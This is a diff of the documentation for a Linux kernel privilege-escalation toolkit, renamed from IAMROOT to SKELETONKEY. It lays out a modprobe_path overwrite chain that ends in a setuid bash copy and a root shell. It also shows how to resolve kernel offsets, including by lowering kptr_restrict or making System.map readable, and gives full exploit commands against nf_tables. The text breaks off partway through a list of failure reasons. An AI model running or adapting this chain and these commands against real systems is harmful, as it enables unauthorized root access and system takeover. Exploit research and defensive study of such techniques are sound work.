@@ -1,20 +1,20 @@
-# IAMROOT — kernel offset resolution
+# SKELETONKEY — kernel offset resolution
 
 The 7 🟡 PRIMITIVE modules each land a kernel-side primitive (heap-OOB
 write, slab UAF, etc.). The default `--exploit` returns
-`IAMROOT_EXPLOIT_FAIL` after the primitive fires — the verified-vs-claimed
+`SKELETONKEY_EXPLOIT_FAIL` after the primitive fires — the verified-vs-claimed
 bar means we don't claim root unless we empirically have it.
 
 `--full-chain` engages the shared finisher (`core/finisher.{c,h}`) which
 converts the primitive to a real root pop via `modprobe_path` overwrite:
 
 ```
-attacker → arb_write(modprobe_path, "/tmp/iamroot-mp-<pid>.sh")
-        → execve("/tmp/iamroot-trig-<pid>")     # unknown-format binary
+attacker → arb_write(modprobe_path, "/tmp/skeletonkey-mp-<pid>.sh")
+        → execve("/tmp/skeletonkey-trig-<pid>")     # unknown-format binary
         → kernel call_modprobe()                # spawns modprobe_path as init
-        → /tmp/iamroot-mp-<pid>.sh runs as root
-        → cp /bin/bash /tmp/iamroot-pwn-<pid>; chmod 4755 /tmp/iamroot-pwn-<pid>
-        → caller exec /tmp/iamroot-pwn-<pid> -p
+        → /tmp/skeletonkey-mp-<pid>.sh runs as root
+        → cp /bin/bash /tmp/skeletonkey-pwn-<pid>; chmod 4755 /tmp/skeletonkey-pwn-<pid>
+        → caller exec /tmp/skeletonkey-pwn-<pid> -p
         → root shell
 ```
 
@@ -27,14 +27,14 @@ address) at runtime.
 non-zero value for each field:
 
 1. **Environment variables** — operator override.
-   - `IAMROOT_KBASE=0x...`
-   - `IAMROOT_MODPROBE_PATH=0x...`
-   - `IAMROOT_POWEROFF_CMD=0x...`
-   - `IAMROOT_INIT_TASK=0x...`
-   - `IAMROOT_INIT_CRED=0x...`
-   - `IAMROOT_CRED_OFFSET_REAL=0x...` (offset of `real_cred` in `task_struct`)
-   - `IAMROOT_CRED_OFFSET_EFF=0x...`
-   - `IAMROOT_UID_OFFSET=0x...` (offset of `uid_t uid` in `cred`, usually 0x4)
+   - `SKELETONKEY_KBASE=0x...`
+   - `SKELETONKEY_MODPROBE_PATH=0x...`
+   - `SKELETONKEY_POWEROFF_CMD=0x...`
+   - `SKELETONKEY_INIT_TASK=0x...`
+   - `SKELETONKEY_INIT_CRED=0x...`
+   - `SKELETONKEY_CRED_OFFSET_REAL=0x...` (offset of `real_cred` in `task_struct`)
+   - `SKELETONKEY_CRED_OFFSET_EFF=0x...`
+   - `SKELETONKEY_UID_OFFSET=0x...` (offset of `uid_t uid` in `cred`, usually 0x4)
 
 2. **`/proc/kallsyms`** — only useful when `kernel.kptr_restrict=0`
    OR you're already root. On modern distros (kptr_restrict=1 by
@@ -60,18 +60,18 @@ non-zero value for each field:
 sudo grep -E ' (modprobe_path|init_task|_text)$' /proc/kallsyms
 
 # Use the addresses inline:
-IAMROOT_MODPROBE_PATH=0xffffffff8228e7e0 \
-  iamroot --exploit nf_tables --i-know --full-chain
+SKELETONKEY_MODPROBE_PATH=0xffffffff8228e7e0 \
+  skeletonkey --exploit nf_tables --i-know --full-chain
 ```
 
 ### Automated dump (preferred for upstreaming)
 
-`iamroot --dump-offsets` walks the four-source chain itself and emits
+`skeletonkey --dump-offsets` walks the four-source chain itself and emits
 a ready-to-paste C struct entry on stdout:
 
 ```bash
-sudo iamroot --dump-offsets
-# /* Generated 2026-05-16 by `iamroot --dump-offsets`.
+sudo skeletonkey --dump-offsets
+# /* Generated 2026-05-16 by `skeletonkey --dump-offsets`.
 #  * Host kernel: 5.15.0-56-generic  distro=ubuntu
 #  * Resolved fields: modprobe_path=kallsyms init_task=kallsyms cred=table
 #  * Paste this entry into kernel_table[] in core/offsets.c.
@@ -88,21 +88,21 @@ sudo iamroot --dump-offsets
 ```
 
 Paste the block into `kernel_table[]` in `core/offsets.c`, rebuild,
-and the new entry covers every IAMROOT user on that kernel. Open a
+and the new entry covers every SKELETONKEY user on that kernel. Open a
 PR to upstream it.
 
 ### Per-host (write System.map readable)
 
 ```bash
 sudo chmod 0644 /boot/System.map-$(uname -r)
-iamroot --exploit nf_tables --i-know --full-chain
+skeletonkey --exploit nf_tables --i-know --full-chain
 ```
 
 ### Per-boot (lower kptr_restrict)
 
 ```bash
 sudo sysctl kernel.kptr_restrict=0
-iamroot --exploit nf_tables --i-know --full-chain
+skeletonkey --exploit nf_tables --i-know --full-chain
 ```
 
 Note: each of these requires root *once*. For a true non-root LPE on
@@ -144,14 +144,14 @@ build + distro you tested against. Upstreamed entries make the
 
 ## Verifying success
 
-The shared finisher (`iamroot_finisher_modprobe_path()`) drops a
-sentinel file at `/tmp/iamroot-pwn-<pid>` after `modprobe` runs our
+The shared finisher (`skeletonkey_finisher_modprobe_path()`) drops a
+sentinel file at `/tmp/skeletonkey-pwn-<pid>` after `modprobe` runs our
 payload. The finisher polls for this file with `S_ISUID` mode set
 for up to 3 seconds. Only when the sentinel materializes does the
-module return `IAMROOT_EXPLOIT_OK` and (unless `--no-shell`) exec
+module return `SKELETONKEY_EXPLOIT_OK` and (unless `--no-shell`) exec
 the setuid bash to drop a root shell.
 
-If the sentinel never appears the module returns `IAMROOT_EXPLOIT_FAIL`
+If the sentinel never appears the module returns `SKELETONKEY_EXPLOIT_FAIL`
 with a diagnostic. Reasons it might fail even with offsets resolved:
 
 - The arb-write didn't actually land (slab adjacency lost, value-pointer
